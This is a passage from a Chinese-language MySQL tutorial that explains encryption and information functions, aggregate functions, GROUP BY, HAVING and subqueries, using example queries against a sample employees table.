<h3 id="%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E5%87%BD%E6%95%B0">&#x52A0;&#x5BC6;&#x4E0E;&#x89E3;&#x5BC6;&#x51FD;&#x6570;</h3>
<pre><code class="language-javascript">/*
PASSWORD(str) =&gt; &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;str&#x7684;&#x52A0;&#x5BC6;&#x7248;&#x672C;,41&#x4F4D;&#x957F;&#x7684;&#x5B57;&#x7B26;&#x4E32;.&#x52A0;&#x5BC6;&#x7ED3;&#x679C;&#x4E0D;&#x53EF;&#x9006;,&#x5E38;&#x7528;&#x4E8E;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x52A0;&#x5BC6;
MD5(str) =&gt; &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32;str&#x7684;md5&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x503C;,&#x4E5F;&#x662F;&#x4E00;&#x79CD;&#x52A0;&#x5BC6;&#x65B9;&#x5F0F;.&#x82E5;&#x53C2;&#x6570;&#x4E3A;NULL&#x5219;&#x4F1A;&#x8FD4;&#x56DE;NULL
SHA(str) =&gt; &#x4ECE;&#x539F;&#x660E;&#x6587;&#x5BC6;&#x7801;str&#x8BA1;&#x7B97;&#x5E76;&#x8FD4;&#x56DE;&#x52A0;&#x5BC6;&#x540E;&#x7684;&#x5BC6;&#x7801;&#x5B57;&#x7B26;&#x4E32;,&#x5F53;&#x53C2;&#x6570;&#x4E3A;NULL&#x65F6;&#x8FD4;&#x56DE;NULL.SHA&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x6BD4;MD5&#x66F4;&#x52A0;&#x5B89;&#x5168;
ENCODE(value,password_seed) =&gt; &#x8FD4;&#x56DE;&#x4F7F;&#x7528;password_seed&#x4F5C;&#x4E3A;&#x52A0;&#x5BC6;&#x5BC6;&#x7801;&#x52A0;&#x5BC6;value
DECODE(value,password_seed) =&gt; &#x8FD4;&#x56DE;&#x4F7F;&#x7528;password_seed&#x4F5C;&#x4E3A;&#x52A0;&#x5BC6;&#x5BC6;&#x7801;&#x89E3;&#x5BC6;value
*/
// PASSWORD&#x3001;ENCODE&#x3001;DECODE =&gt; 5.7&#x53EF;&#x4EE5;;8&#x7248;&#x672C;&#x5F03;&#x7528;
// &#x4E0D;&#x53EF;&#x9006;&#x7684;MD5&#x548C;SHA
SELECT MD5(&apos;mysql&apos;),SHA(&apos;mysql&apos;) FROM DUAL;
</code></pre>
<h3 id="mysql%E4%BF%A1%E6%81%AF%E5%87%BD%E6%95%B0">MySQL&#x4FE1;&#x606F;&#x51FD;&#x6570;</h3>
<pre><code class="language-javascript">/*
VERSION() =&gt; &#x8FD4;&#x56DE;&#x5F53;&#x524D; MySQL &#x7684;&#x7248;&#x672C;&#x53F7;
CONNECTION_ID() =&gt; &#x8FD4;&#x56DE;&#x5F53;&#x524D; MySQL &#x670D;&#x52A1;&#x5668;&#x7684;&#x8FDE;&#x63A5;&#x6570;
DATABASE()&#xFF0C;SCHEMA() =&gt; &#x8FD4;&#x56DE; MySQL &#x547D;&#x4EE4;&#x884C;&#x5F53;&#x524D;&#x6240;&#x5728;&#x7684;&#x6570;&#x636E;&#x5E93;
USER()|CURRENT_USER()|SYSTEM_USER()|SESSION_USER() =&gt; &#x8FD4;&#x56DE;&#x5F53;&#x524D;&#x8FDE;&#x63A5; MySQL &#x7684;&#x7528;&#x6237;&#x540D;;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#x683C;&#x5F0F;&#x4E3A;&quot;&#x4E3B;&#x673A;&#x540D;@&#x7528;&#x6237;&#x540D;&quot;
CHARSET(value) =&gt; &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32; value &#x81EA;&#x53D8;&#x91CF;&#x7684;&#x5B57;&#x7B26;&#x96C6;
COLLATION(value) =&gt; &#x8FD4;&#x56DE;&#x5B57;&#x7B26;&#x4E32; value &#x7684;&#x6BD4;&#x8F83;&#x89C4;&#x5219;
*/
SELECT VERSION(),CONNECTION_ID(),DATABASE(),SCHEMA(),USER(),CHARSET(&apos;zs&apos;),COLLATION(&apos;zs&apos;) FROM DUAL;
</code></pre>
<h3 id="%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0">&#x5176;&#x4ED6;&#x51FD;&#x6570;</h3>
<pre><code class="language-javascript">/*
FORMAT(value,n) =&gt; &#x8FD4;&#x56DE;&#x5BF9;&#x6570;&#x5B57;value&#x8FDB;&#x884C;&#x683C;&#x5F0F;&#x5316;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x6570;&#x636E;;n&#x8868;&#x793A;&#x56DB;&#x820D;&#x4E94;&#x5165;&#x540E;&#x4FDD;&#x7559;&#x5230;&#x5C0F;&#x6570;&#x70B9;&#x540E;n&#x4F4D;
CONV(value,from,to) =&gt; &#x5C06;value&#x7684;&#x503C;&#x8FDB;&#x884C;&#x4E0D;&#x540C;&#x8FDB;&#x5236;&#x4E4B;&#x95F4;&#x7684;&#x8F6C;&#x6362;
INET_ATON(ipvalue) =&gt; &#x5C06;&#x4EE5;&#x70B9;&#x5206;&#x9694;&#x7684;IP&#x5730;&#x5740;&#x8F6C;&#x5316;&#x4E3A;&#x4E00;&#x4E2A;&#x6570;&#x5B57;
INET_NTOA(value) =&gt; &#x5C06;&#x6570;&#x5B57;&#x5F62;&#x5F0F;&#x7684;IP&#x5730;&#x5740;&#x8F6C;&#x5316;&#x4E3A;&#x4EE5;&#x70B9;&#x5206;&#x9694;&#x7684;IP&#x5730;&#x5740;
BENCHMARK(n,expr) =&gt; &#x5C06;&#x8868;&#x8FBE;&#x5F0F;expr&#x91CD;&#x590D;&#x6267;&#x884C;n&#x6B21;.&#x7528;&#x4E8E;&#x6D4B;&#x8BD5;MySQL&#x5904;&#x7406;expr&#x8868;&#x8FBE;&#x5F0F;&#x6240;&#x8017;&#x8D39;&#x7684;&#x65F6;&#x95F4;
CONVERT(value USING char_code) =&gt; &#x5C06;value&#x6240;&#x4F7F;&#x7528;&#x7684;&#x5B57;&#x7B26;&#x7F16;&#x7801;&#x4FEE;&#x6539;&#x4E3A;char_code
*/
// n&#x503C;&#x5C0F;&#x4E8E;&#x6216;&#x7B49;&#x4E8E;0&#x5219;&#x53EA;&#x4FDD;&#x7559;&#x6574;&#x6570;&#x4F4D;
SELECT FORMAT(123.456,2),FORMAT(123.456,-2) FROM DUAL;
SELECT CONV(16, 10, 2), CONV(8888,10,16), CONV(NULL, 10, 2);
SELECT INET_ATON(&apos;192.168.4.22&apos;),INET_NTOA(3232236566) FROM DUAL;
// &#x68C0;&#x67E5;&#x8017;&#x65F6;
SELECT BENCHMARK(1, MD5(&apos;mysql&apos;)) FROM DUAL;
SELECT BENCHMARK(1000000, MD5(&apos;mysql&apos;)) FROM DUAL;
SELECT CHARSET(&apos;zs&apos;), CHARSET(CONVERT(&apos;zs&apos; USING &apos;utf8mb4&apos;)) FROM DUAL;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0">&#x805A;&#x5408;&#x51FD;&#x6570;</h2>
<p>&#x805A;&#x5408;&#x6216;&#x805A;&#x96C6;&#x3001;&#x5206;&#x7EC4;&#x51FD;&#x6570;&#xFF0C;&#x662F;&#x5BF9;&#x4E00;&#x7EC4;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x6C47;&#x603B;&#x7684;&#x51FD;&#x6570;&#xFF0C;&#x8F93;&#x5165;&#x662F;&#x4E00;&#x7EC4;&#x6570;&#x636E;&#x7684;&#x96C6;&#x5408;&#xFF0C;&#x8F93;&#x51FA;&#x7684;&#x662F;&#x5355;&#x4E2A;&#x503C;&#x3002;&#x805A;&#x5408;&#x51FD;&#x6570;&#x4E0D;&#x80FD;&#x5D4C;&#x5957;&#x8C03;&#x7528;&#x3002;</p>
<h3 id="%E5%B8%B8%E8%A7%81%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0">&#x5E38;&#x89C1;&#x805A;&#x5408;&#x51FD;&#x6570;</h3>
<pre><code class="language-javascript">/*
AVG =&gt; &#x8FD4;&#x56DE;&#x6570;&#x503C;&#x5217;&#x7684;&#x5E73;&#x5747;&#x503C; =&gt; &#x4EC5;&#x9002;&#x7528;&#x4E8E;&#x6570;&#x503C;&#x7C7B;&#x578B;
SUM =&gt; &#x8FD4;&#x56DE;&#x6570;&#x503C;&#x5217;&#x7684;&#x603B;&#x548C; =&gt; &#x4EC5;&#x9002;&#x7528;&#x4E8E;&#x6570;&#x503C;&#x7C7B;&#x578B;
MAX/MIN =&gt; &#x53EF;&#x4EE5;&#x5BF9;&#x4EFB;&#x610F;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x7684;&#x6570;&#x636E;&#x4F7F;&#x7528; MIN &#x548C; MAX &#x51FD;&#x6570;
COUNT =&gt; &#x8BA1;&#x7B97;&#x6307;&#x5B9A;&#x5B57;&#x6BB5;&#x5728;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x4E2D;&#x51FA;&#x73B0;&#x7684;&#x4E2A;&#x6570; =&gt; &#x9002;&#x7528;&#x4E8E;&#x4EFB;&#x610F;&#x6570;&#x636E;&#x7C7B;&#x578B;
! AVG = SUM / COUNT
*/
SELECT AVG(salary),MAX(salary),MIN(salary),SUM(salary) FROM employees WHERE job_id LIKE &apos;%REP%&apos;;
SELECT MIN(hire_date),MAX(hire_date) FROM employees;
SELECT COUNT(employee_id),COUNT(salar) FROM employees;
// COUNT(*)&#x8FD4;&#x56DE;&#x8868;&#x4E2D;&#x8BB0;&#x5F55;&#x603B;&#x6570;
SELECT COUNT(*) FROM employees WHERE department_id = 50;
// COUNT(expr) =&gt; &#x8FD4;&#x56DE;expr&#x4E0D;&#x4E3A;&#x7A7A;&#x7684;&#x8BB0;&#x5F55;&#x603B;&#x6570; =&gt; COUNT &#x4E0D;&#x8BA1;&#x7B97;&#x7A7A;&#x503C;
SELECT COUNT(commission_pct) FROM employees WHERE department_id = 50;
</code></pre>
<p>&#x4F7F;&#x7528; count(*)&#x3001;count(1) &#x548C; count(&#x5217;&#x540D;) &#x65F6;&#x9700;&#x8981;&#x6CE8;&#x610F;&#xFF0C;&#x82E5;&#x8981;&#x6C42;&#x662F;&#x6307;&#x5B9A;&#x5B57;&#x6BB5;&#x51FA;&#x73B0;&#x4E2A;&#x6570;&#x65F6;&#xFF0C;&#x524D;&#x4E24;&#x8005;&#x90FD;&#x53EF;&#x5B9E;&#x73B0;&#xFF0C;&#x540E;&#x8005;&#x56E0;&#x5217;&#x540D;&#x53EF;&#x80FD;&#x5B58;&#x5728; NULL &#x503C;&#xFF0C;&#x7ED3;&#x679C;&#x4E0D;&#x4E00;&#x5B9A;&#x51C6;&#x786E;&#x3002;</p>
<h3 id="group-by">GROUP BY</h3>
<pre><code class="language-javascript">/*
GROUP BY =&gt; &#x5C06;&#x5177;&#x6709;&#x76F8;&#x540C;&#x503C;&#x7684;&#x884C;&#x5206;&#x7EC4;&#x5230;&#x6C47;&#x603B;&#x884C;&#x4E2D;
GROUP BY&#x8BED;&#x53E5;&#x901A;&#x5E38;&#x4E0E;&#x805A;&#x5408;&#x51FD;&#x6570; ( COUNT(), MAX(), MIN(), SUM(), AVG() ) &#x4E00;&#x8D77;&#x4F7F;&#x7528;,&#x4EE5;&#x6309;&#x4E00;&#x5217;&#x6216;&#x591A;&#x5217;&#x5BF9;&#x7ED3;&#x679C;&#x96C6;&#x8FDB;&#x884C;&#x5206;&#x7EC4;
SELECT &#x4E2D;&#x51FA;&#x73B0;&#x7684;&#x975E;&#x805A;&#x5408;&#x51FD;&#x6570;&#x7684;&#x5B57;&#x6BB5;&#x5FC5;&#x987B;&#x58F0;&#x660E;&#x5728; GROUP BY &#x51FD;&#x6570;&#x4E2D;;&#x53CD;&#x4E4B; GROUP BY &#x4E2D;&#x58F0;&#x660E;&#x7684;&#x5B57;&#x6BB5;&#x4E0D;&#x4E00;&#x5B9A;&#x51FA;&#x73B0;&#x5728; SELECT &#x4E2D;
GROUP BY &#x51FA;&#x73B0;&#x4F4D;&#x7F6E;&#x4E8E; FROM &#x540E;&#x3001;WHERE &#x540E;&#x3001;ORDER BY &#x524D;&#x3001;LIMIT &#x524D;
&#x4F7F;&#x7528; WITH ROLLUP &#x5173;&#x952E;&#x5B57;&#x4E4B;&#x540E;&#x5728;&#x6240;&#x6709;&#x67E5;&#x8BE2;&#x51FA;&#x7684;&#x5206;&#x7EC4;&#x8BB0;&#x5F55;&#x4E4B;&#x540E;&#x589E;&#x52A0;&#x4E00;&#x6761;&#x8BB0;&#x5F55;;&#x8BE5;&#x8BB0;&#x5F55;&#x8BA1;&#x7B97;&#x67E5;&#x8BE2;&#x51FA;&#x7684;&#x6240;&#x6709;&#x8BB0;&#x5F55;&#x7684;&#x5E73;&#x5747;&#x503C;
&#x4F7F;&#x7528; WITH ROLLUP &#x5173;&#x952E;&#x5B57;&#x65F6;&#x8981;&#x614E;&#x7528; ORDER BY
*/
// &#x67E5;&#x8BE2;&#x6BCF;&#x4E2A;&#x90E8;&#x95E8;&#x7684;&#x5E73;&#x5747;&#x5DE5;&#x8D44;
SELECT department_id,AVG(salary) FROM employees GROUP BY department_id;
// &#x67E5;&#x770B;&#x6BCF;&#x4E2A;&#x5DE5;&#x79CD;&#x7684;&#x5E73;&#x5747;&#x5DE5;&#x8D44;
SELECT job_id,AVG(salary) FROM employees GROUP BY job_id;
// &#x67E5;&#x8BE2;&#x5404;&#x4E2A;department_id,job_id&#x7684;&#x5E73;&#x5747;&#x5DE5;&#x8D44;
SELECT department_id,job_id,AVG(salary) FROM employees GROUP BY department_id,job_id;
SELECT job_id,department_id,AVG(salary) FROM employees GROUP BY job_id,department_id;
// &#x9519;&#x8BEF;&#x5F62;&#x5F0F; job_id &#x672A;&#x51FA;&#x73B0;&#x5728; GROUP BY &#x4E2D; =&gt; &#x4E00;&#x4E2A;&#x90E8;&#x95E8;&#x4E0D;&#x4E00;&#x5B9A;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x5DE5;&#x79CD;
SELECT department_id,job_id,AVG(salary) FROM employees GROUP BY department_id;
// &#x67E5;&#x8BE2;&#x5404;&#x4E2A;&#x90E8;&#x95E8;&#x5E73;&#x5747;&#x5DE5;&#x8D44;&#x5E76;&#x5347;&#x5E8F;&#x6392;&#x5217; =&gt; &#x6B63;&#x786E;
SELECT department_id,AVG(salary) avg_sal FROM employees GROUP BY department_id ORDER BY avg_sal ASC;
// &#x67E5;&#x8BE2;&#x5404;&#x4E2A;&#x90E8;&#x95E8;&#x5E73;&#x5747;&#x5DE5;&#x8D44;&#x5E76;&#x5347;&#x5E8F;&#x6392;&#x5217; =&gt; &#x9519;&#x8BEF;
SELECT department_id,AVG(salary) avg_sal FROM employees GROUP BY department_id WITH ROLLUP ORDER BY avg_sal ASC;
</code></pre>
<h3 id="having">HAVING</h3>
<pre><code class="language-javascript">/*
HAVING =&gt; &#x8FC7;&#x6EE4;&#x5206;&#x7EC4;
&#x4F7F;&#x7528;&#x524D;&#x63D0;&#x662F; SQL &#x4E2D;&#x4F7F;&#x7528;&#x4E86; GROUP BY
&#x5F53;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6;&#x4E2D;&#x6709;&#x805A;&#x5408;&#x51FD;&#x6570;,&#x5219;&#x6B64;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6;&#x5FC5;&#x987B;&#x58F0;&#x660E;&#x5728; HAVING &#x5185;;&#x5F53;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6;&#x6CA1;&#x6709;&#x805A;&#x5408;&#x51FD;&#x6570;,&#x5219;&#x6B64;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6;&#x53EF;&#x4EE5;&#x5728; WHERE &#x6216; HAVING &#x4E2D;&#x58F0;&#x660E;.&#x5EFA;&#x8BAE;&#x58F0;&#x660E;&#x5728;&#x524D;&#x8005;,&#x6548;&#x7387;&#x66F4;&#x9AD8;
*/
// &#x67E5;&#x8BE2;&#x5404;&#x90E8;&#x95E8;&#x6700;&#x9AD8;&#x5DE5;&#x8D44;&#x8F83;10000&#x9AD8;&#x7684;&#x90E8;&#x95E8;
// &#x9519;&#x8BEF;&#x5199;&#x6CD5; =&gt; ERROR 1111 (HY000): Invalid use of group function
SELECT department_id,MAX(salary) FROM employees WHERE MAX(salary) &gt; 10000 GROUP BY department_id;
// &#x6B63;&#x786E;&#x5199;&#x6CD5; =&gt; &#x8FC7;&#x6EE4;&#x6761;&#x4EF6;&#x51FA;&#x73B0;&#x805A;&#x5408;&#x51FD;&#x6570;,&#x8981;&#x6C42;&#x8FC7;&#x6EE4;&#x6761;&#x4EF6;&#x4F7F;&#x7528; HAVING &#x66FF;&#x6362; WHERE,&#x4E14;&#x5FC5;&#x987B;&#x58F0;&#x660E;&#x5728; GROUP BY &#x540E;&#x9762;
// WHERE &#x5185;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x805A;&#x5408;&#x51FD;&#x6570; =&gt; &#x5C40;&#x9650;&#x6027;
SELECT department_id,MAX(salary) FROM employees GROUP BY department_id HAVING MAX(salary) &gt; 10000;
// &#x67E5;&#x8BE2;&#x90E8;&#x95E8; id &#x4E3A;10-40&#x56DB;&#x4E2A;&#x90E8;&#x95E8;&#x4E2D;&#x6700;&#x9AD8;&#x5DE5;&#x8D44;&#x9AD8;&#x4E8E;10000&#x7684;&#x90E8;&#x95E8;&#x4FE1;&#x606F;
// &#x65B9;&#x5F0F;&#x4E00; =&gt; &#x63A8;&#x8350; =&gt; &#x6267;&#x884C;&#x6548;&#x7387;&#x9AD8;
SELECT department_id, MAX(salary) FROM employees WHERE department_id IN (10,20,30,40) GROUP BY department_id HAVING MAX(salary) &gt; 10000;
// &#x65B9;&#x5F0F;&#x4E8C;
SELECT department_id, MAX(salary) FROM employees GROUP BY department_id HAVING MAX(salary) &gt; 10000 AND department_id IN (10,20,30,40);
</code></pre>
<p>WHERE &#x548C; HAVING &#x76F8;&#x6BD4;&#xFF0C;&#x524D;&#x8005;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x8868;&#x4E2D;&#x7684;&#x5B57;&#x6BB5;&#x4F5C;&#x4E3A;&#x7B5B;&#x9009;&#x6761;&#x4EF6;&#xFF0C;&#x4F46;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x5206;&#x7EC4;&#x4E2D;&#x7684;&#x8BA1;&#x7B97;&#x51FD;&#x6570;&#x4F5C;&#x4E3A;&#x7B5B;&#x9009;&#x6761;&#x4EF6;&#xFF1B;&#x540E;&#x8005;&#x5FC5;&#x987B;&#x8981;&#x4E0E; GROUP BY &#x914D;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;&#x5206;&#x7EC4;&#x8BA1;&#x7B97;&#x7684;&#x51FD;&#x6570;&#x548C;&#x5206;&#x7EC4;&#x5B57;&#x6BB5;&#x4F5C;&#x4E3A;&#x7B5B;&#x9009;&#x6761;&#x4EF6;&#x3002;&#x6240;&#x4EE5;&#x5728;&#x9700;&#x8981;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5206;&#x7EC4;&#x7EDF;&#x8BA1;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x540E;&#x8005;&#x53EF;&#x4EE5;&#x5B8C;&#x6210;&#x524D;&#x8005;&#x4E0D;&#x80FD;&#x5B8C;&#x6210;&#x7684;&#x4EFB;&#x52A1;&#x3002;&#x8FD9;&#x662F;&#x56E0;&#x4E3A;&#x67E5;&#x8BE2;&#x8BED;&#x6CD5;&#x7ED3;&#x6784;&#x4E2D;&#xFF0C;WHERE &#x5728; GROUP BY &#x4E4B;&#x524D;&#xFF0C;&#x6240;&#x4EE5;&#x65E0;&#x6CD5;&#x5BF9;&#x5206;&#x7EC4;&#x7ED3;&#x679C;&#x8FDB;&#x884C;&#x7B5B;&#x9009;&#x3002;HAVING &#x5728; GROUP BY &#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5206;&#x7EC4;&#x5B57;&#x6BB5;&#x548C;&#x5206;&#x7EC4;&#x4E2D;&#x7684;&#x8BA1;&#x7B97;&#x51FD;&#x6570;&#xFF0C;&#x5BF9;&#x5206;&#x7EC4;&#x7684;&#x7ED3;&#x679C;&#x96C6;&#x8FDB;&#x884C;&#x7B5B;&#x9009;&#xFF0C;&#x8FD9;&#x4E2A;&#x529F;&#x80FD;&#x662F; WHERE &#x65E0;&#x6CD5;&#x5B8C;&#x6210;&#x7684;&#x3002;&#x53E6;&#x5916;&#xFF0C;WHERE &#x6392;&#x9664;&#x7684;&#x8BB0;&#x5F55;&#x4E0D;&#x518D;&#x5305;&#x62EC;&#x5728;&#x5206;&#x7EC4;&#x4E2D;&#x3002;</p>
<p>&#x5982;&#x679C;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x8FDE;&#x63A5;&#x4ECE;&#x5173;&#x8054;&#x8868;&#x4E2D;&#x83B7;&#x53D6;&#x9700;&#x8981;&#x7684;&#x6570;&#x636E;&#xFF0C;WHERE &#x662F;&#x5148;&#x7B5B;&#x9009;&#x540E;&#x8FDE;&#x63A5;&#xFF0C;&#x800C; HAVING &#x662F;&#x5148;&#x8FDE;&#x63A5;&#x540E;&#x7B5B;&#x9009;&#x3002; &#x8FD9;&#x4E00;&#x70B9;&#x5C31;&#x51B3;&#x5B9A;&#x4E86;&#x5728;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x4E2D;&#xFF0C;&#x524D;&#x8005;&#x6BD4;&#x540E;&#x8005;&#x66F4;&#x9AD8;&#x6548;&#x3002;&#x56E0;&#x4E3A;&#x524D;&#x8005;&#x53EF;&#x4EE5;&#x5148;&#x7B5B;&#x9009;&#xFF0C;&#x7528;&#x4E00;&#x4E2A;&#x7B5B;&#x9009;&#x540E;&#x7684;&#x8F83;&#x5C0F;&#x6570;&#x636E;&#x96C6;&#x548C;&#x5173;&#x8054;&#x8868;&#x8FDB;&#x884C;&#x8FDE;&#x63A5;&#xFF0C;&#x8FD9;&#x6837;&#x5360;&#x7528;&#x7684;&#x8D44;&#x6E90;&#x6BD4;&#x8F83;&#x5C11;&#xFF0C;&#x6267;&#x884C;&#x6548;&#x7387;&#x4E5F;&#x6BD4;&#x8F83;&#x9AD8;&#x3002;&#x540E;&#x8005;&#x5219;&#x9700;&#x8981;&#x5148;&#x628A;&#x7ED3;&#x679C;&#x96C6;&#x51C6;&#x5907;&#x597D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7528;&#x672A;&#x88AB;&#x7B5B;&#x9009;&#x7684;&#x6570;&#x636E;&#x96C6;&#x8FDB;&#x884C;&#x5173;&#x8054;&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x8FD9;&#x4E2A;&#x5927;&#x7684;&#x6570;&#x636E;&#x96C6;&#x8FDB;&#x884C;&#x7B5B;&#x9009;&#xFF0C;&#x8FD9;&#x6837;&#x5360;&#x7528;&#x7684;&#x8D44;&#x6E90;&#x5C31;&#x6BD4;&#x8F83;&#x591A;&#xFF0C;&#x6267;&#x884C;&#x6548;&#x7387;&#x4E5F;&#x8F83;&#x4F4E;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%AD%90%E6%9F%A5%E8%AF%A2">&#x5B50;&#x67E5;&#x8BE2;</h2>
<p>&#x5B50;&#x67E5;&#x8BE2; subquery &#x662F;&#x53EF;&#x5D4C;&#x5957;&#x5728;&#x67E5;&#x8BE2;&#x4E2D;&#x7684;&#x5185;&#x90E8;&#x67E5;&#x8BE2;&#xFF0C;&#x4ECE;&#x5185;&#x5411;&#x5916;&#x8FDB;&#x884C;&#x5904;&#x7406;&#xFF0C;&#x82E5;&#x5C06;&#x67E5;&#x8BE2;&#x89C6;&#x4E3A;&#x904D;&#x5386;&#xFF0C;&#x5B50;&#x67E5;&#x8BE2;&#x53EF;&#x770B;&#x4F5C;&#x5D4C;&#x5957; For &#x5FAA;&#x73AF;&#x3002;&#x80FD;&#x5D4C;&#x5957;&#x7684;&#x5B50;&#x67E5;&#x8BE2;&#x6570;&#x76EE;&#x4E0D;&#x9650;&#xFF0C;&#x4F46;&#x5B9E;&#x9645;&#x5E94;&#x8003;&#x8651;&#x6027;&#x80FD;&#x7684;&#x9650;&#x5236;&#x3002;</p>
<pre><code class="language-javascript">/*
&#x5B50;&#x67E5;&#x8BE2;&#x5728;&#x4E3B;&#x67E5;&#x8BE2;&#x524D;&#x6267;&#x884C;&#x5B8C;&#x6210;,&#x4E14;&#x5176;&#x7ED3;&#x679C;&#x88AB;&#x4E3B;&#x67E5;&#x8BE2;&#x4F7F;&#x7528;
&#x5B50;&#x67E5;&#x8BE2;&#x4F7F;&#x7528;&#x62EC;&#x53F7;&#x5305;&#x88F9;,&#x653E;&#x5728;&#x6BD4;&#x8F83;&#x6761;&#x4EF6;&#x7684;&#x53F3;&#x4FA7;&#x53EF;&#x8BFB;&#x6027;&#x9AD8;
*/
// &#x67E5;&#x627E;&#x51FA;&#x8F83; Abel &#x66F4;&#x9AD8;&#x5DE5;&#x8D44;&#x7684;&#x540C;&#x4E8B;,&#x5217;&#x51FA;&#x85AA;&#x8D44;
// &#x65B9;&#x5F0F;&#x4E00;
SELECT salary FROM employees WHERE last_name = &apos;Abel&apos;;
SELECT last_name,salary FROM employees WHERE salary &gt; 11000;
// &#x65B9;&#x5F0F;&#x4E8C; =&gt; &#x81EA;&#x8FDE;&#x63A5;
SELECT e2.last_name,e2.salary FROM employees e1,employees e2 WHERE e1.last_name = &apos;Abel&apos; AND e1.`salary` &lt; e2.`salary`;
// &#x65B9;&#x5F0F;&#x4E09; =&gt; &#x5B50;&#x67E5;&#x8BE2;
SELECT last_name,salary FROM employees WHERE salary &gt; ( SELECT salary FROM employees WHERE last_name = &apos;Abel&apos; );
</code></pre>
<p>&#x6309;&#x5185;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#x8FD4;&#x56DE;&#x4E00;&#x6761;&#x8FD8;&#x662F;&#x591A;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x53EF;&#x5C06;&#x5B50;&#x67E5;&#x8BE2;&#x5206;&#x4E3A;&#x5355;&#x884C;&#x5B50;&#x67E5;&#x8BE2;&#x3001;&#x591A;&#x884C;&#x5B50;&#x67E5;&#x8BE2;&#x3002;&#x6309;&#x5B50;&#x67E5;&#x8BE2;&#x662F;&#x5426;&#x88AB;&#x6267;&#x884C;&#x591A;&#x6B21;&#xFF0C;&#x53EF;&#x5C06;&#x5B50;&#x67E5;&#x8BE2;&#x5206;&#x4E3A;&#x76F8;&#x5173;|&#x5173;&#x8054;&#x5B50;&#x67E5;&#x8BE2;&#x548C;&#x4E0D;&#x76F8;&#x5173;|&#x975E;&#x5173;&#x8054;&#x5B50;&#x67E5;&#x8BE2;&#x3002;</p>
<h3 id="%E5%8D%95%E8%A1%8C%E5%AD%90%E6%9F%A5%E8%AF%A2">&#x5355;&#x884C;&#x5B50;&#x67E5;&#x8BE2;</h3>
<pre><code class="language-javascript">/*
&#x5355;&#x884C;&#x6BD4;&#x8F83;&#x64CD;&#x4F5C;&#x7B26;
= =&gt; equal to
&gt; =&gt; greater than
&gt;= =&gt; greater than or equal to
&lt; =&gt; less than
&lt;= =&gt; less than or equal to
&lt;&gt; =&gt; not equal to
*/
// &#x8FD4;&#x56DE;job_id&#x4E0E;141&#x53F7;&#x5458;&#x5DE5;&#x76F8;&#x540C;,salary&#x6BD4;143&#x53F7;&#x5458;&#x5DE5;&#x591A;&#x7684;&#x5458;&#x5DE5;&#x59D3;&#x540D;,job_id&#x548C;&#x5DE5;&#x8D44;
SELECT last_name,job_id,salary FROM employees WHERE job_id = ( SELECT job_id FROM employees WHERE employee_id = 141 ) AND salary &gt; ( SELECT salary FROM employees WHERE employee_id = 143 );
// &#x8FD4;&#x56DE;&#x516C;&#x53F8;&#x5DE5;&#x8D44;&#x6700;&#x5C11;&#x7684;&#x5458;&#x5DE5;&#x7684;last_name,job_id&#x548C;salary
SELECT last_name,job_id,salary FROM employees WHERE salary = ( SELECT MIN(salary) FROM employees );
// &#x67E5;&#x8BE2;&#x4E0E;141&#x53F7;&#x5458;&#x5DE5;&#x7684;manager_id&#x548C;department_id&#x76F8;&#x540C;&#x7684;&#x5176;&#x4ED6;&#x5458;&#x5DE5;&#x7684;employee_id,manager_id,department_id
SELECT employee_id, manager_id, department_id FROM employees WHERE manager_id = ( SELECT manager_id FROM employees WHERE employee_id = 141 ) AND department_id = ( SELECT department_id FROM employees WHERE employee_id = 141 ) AND employee_id &lt;&gt; 141;
// &#x67E5;&#x8BE2;&#x4E0E;141&#x53F7;&#x6216;174&#x53F7;&#x5458;&#x5DE5;&#x7684;manager_id&#x548C;department_id&#x76F8;&#x540C;&#x7684;&#x5176;&#x4ED6;&#x5458;&#x5DE5;&#x7684;employee_id,manager_id,department_id
SELECT employee_id, manager_id, department_id FROM employees WHERE manager_id IN (SELECT  manager_id FROM employees WHERE employee_id IN (174,141)) AND department_id IN (SELECT  department_id FROM employees WHERE employee_id IN (174,141)) AND employee_id NOT IN(174,141);
// HAVING &#x4E2D;&#x7684;&#x5B50;&#x67E5;&#x8BE2;
